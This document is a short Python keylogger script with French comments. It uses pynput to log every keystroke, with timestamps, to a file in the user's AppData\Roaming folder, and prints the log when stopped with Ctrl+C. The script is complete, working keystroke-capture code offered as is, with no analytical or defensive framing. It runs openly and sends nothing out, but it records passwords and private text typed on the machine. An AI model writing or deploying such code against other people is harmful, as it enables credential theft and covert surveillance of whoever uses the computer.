import pynput
from datetime import datetime
import os

# Correction ici : on récupère le nom de l'utilisateur réel au moment de l'exécution
username = os.environ.get('USERNAME')
if not username:
    # Fallback si le nom n'est pas trouvé (rare)
    username = "User" 

LOG_FILE = rf"C:\Users\{username}\AppData\Roaming\KeyLogger_Log.txt"

def log_key(key):
    try:
        key_char = str(key.char)
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # On ouvre le fichier en mode append ('a') pour ajouter sans effacer
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {key_char}\n")
            
    except AttributeError:
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key.name}\n")
        except Exception:
            pass

# Lancement de l'écouteur
with pynput.keyboard.Listener(on_press=log_key) as listener:
    print("Keylogger actif... Appuyez sur Ctrl+C pour arrêter.")
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nArrêt du keylogger.")

# Affichage des logs en fin de session
if os.path.exists(LOG_FILE):
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        print(f"Contenu du log :\n{f.read()}")
else:
    print("Aucun fichier de log trouvé.")
